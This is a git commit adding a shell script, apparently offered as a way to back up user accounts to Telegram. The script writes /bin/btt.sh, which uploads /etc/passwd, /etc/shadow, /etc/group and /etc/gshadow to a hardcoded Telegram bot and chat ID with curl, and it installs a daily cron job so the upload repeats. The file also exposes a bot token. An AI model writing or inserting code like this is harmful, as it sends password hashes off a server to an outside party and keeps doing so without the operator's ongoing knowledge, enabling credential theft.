51c3ab0ca248ecc92cc5c37d85e6da1c86822edd
Soheil Saeidpour <136351037+saeidpour80@users.noreply.github.com>
2024-01-28 23:44:52 +0330

    Add files via upload

---
+++ send-users-backup-to-telegram-for-soheil.sh
@@ -0,0 +1,37 @@
+#!/bin/bash
+
+NEEDRESTART_MODE=a apt install cron -y
+systemctl enable cron
+
+echo '#!/usr/bin/expect' >> /bin/btt.sh
+echo '' >> /bin/btt.sh
+echo 'DATE=$(date +"%Y-%m-%d %H:%M:%S")' >> /bin/btt.sh
+echo 'BOT_TOKEN="6622365488:AAG5LK5TDIy_laxghvYuuaPy37LonFyQnz0"' >> /bin/btt.sh
+echo 'CHAT_ID="840860678"' >> /bin/btt.sh
+echo 'file_path=""' >> /bin/btt.sh
+echo 'SERVER_NAME=$(hostname)' >> /bin/btt.sh
+echo 'send_message() {' >> /bin/btt.sh
+echo ' local message="$1"' >> /bin/btt.sh
+echo ' curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \' >> /bin/btt.sh
+echo ' -d "chat_id=$CHAT_ID" \' >> /bin/btt.sh
+echo ' -d "text=$message"' >> /bin/btt.sh
+echo '}' >> /bin/btt.sh
+echo 'send_message "$DATE ----> $SERVER_NAME"' >> /bin/btt.sh
+echo 'send_file() {' >> /bin/btt.sh
+echo ' local file_path="$1"' >> /bin/btt.sh
+echo ' local caption="$2"' >> /bin/btt.sh
+echo ' curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \' >> /bin/btt.sh
+echo ' -F "chat_id=$CHAT_ID" \' >> /bin/btt.sh
+echo ' -F "document=@$file_path" \' >> /bin/btt.sh
+echo ' -F "caption=$caption"' >> /bin/btt.sh
+echo '}' >> /bin/btt.sh
+echo 'send_file "/etc/passwd" "passwd" > /dev/null' >> /bin/btt.sh
+echo 'send_file "/etc/group" "group" > /dev/null' >> /bin/btt.sh
+echo 'send_file "/etc/shadow" "shadow" > /dev/null' >> /bin/btt.sh
+echo 'send_file "/etc/gshadow" "gshadow" > /dev/null' >> /bin/btt.sh
+chmod -v +x /bin/btt.sh
+crontab -l > mycron
+echo "0 3 * * * btt.sh" >> mycron
+crontab mycron
+rm mycron
+sudo service cron restart
